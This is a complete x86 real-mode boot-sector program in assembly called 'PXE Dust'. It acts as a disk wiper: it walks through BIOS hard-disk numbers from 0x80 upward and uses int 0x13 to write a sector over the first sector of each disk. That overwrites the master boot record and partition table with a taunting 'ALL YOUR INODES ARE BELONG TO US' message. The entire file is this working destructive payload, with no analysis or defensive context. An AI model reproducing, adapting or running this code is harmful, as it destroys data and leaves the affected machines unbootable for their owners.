
; ---------------------------------------------------
; PXE Dust                (c)2022 Christopher Woodall
; ---------------------------------------------------
;
; ---------------------------------------------------

; Compiller Info
[BITS 16]     ; 16 Bit Real Mode
[ORG 0x7C00]  ; BIOS Entry Point (where the code is loaded)


; ---------------------------------------------------
;
jmp main
nop


; ---------------------------------------------------
; FAT12 File System (1.44MB)


; ---------------------------------------------------
main:
  ;; Stack Setup
	xor ax, ax	 ; Clear AX
	mov ds, ax   ; Set DS to 0
	mov es, ax   ; Set ES to 0
	mov sp, ax	 ; Set Stack Pointer to 0
	mov ss, ax   ; Set Stack Segment to 0
	mov bp, sp   ; Set Base Pointer to 0
	; mov sp, 0xFFFF

	call loop_disks

	jmp	$


; ---------------------------------------------------
loop_disks:
  .loop:
    call write_disk
    jc .done
		mov ax, [bootdev]
    add ax, 0x01
    mov [bootdev], ax
    jmp .loop
  .done:
    ret


; ---------------------------------------------------
write_disk:
    mov ah, 0x03
    mov bx, DUST
    mov	al, 1	; Write one sector
    mov	ch, 0	; First track
    mov	cl, 1	; First sector
    mov	dh, 0	; First head - assume only one
    mov dl, [bootdev]
    int 0x13

		ret


bootdev db 0x80	; Boot device number

DUST  db  "ALL YOUR INODES ARE BELONG TO US...",0xD,0xA,0

times	510-($-$$)	db	0
dw	0xAA55
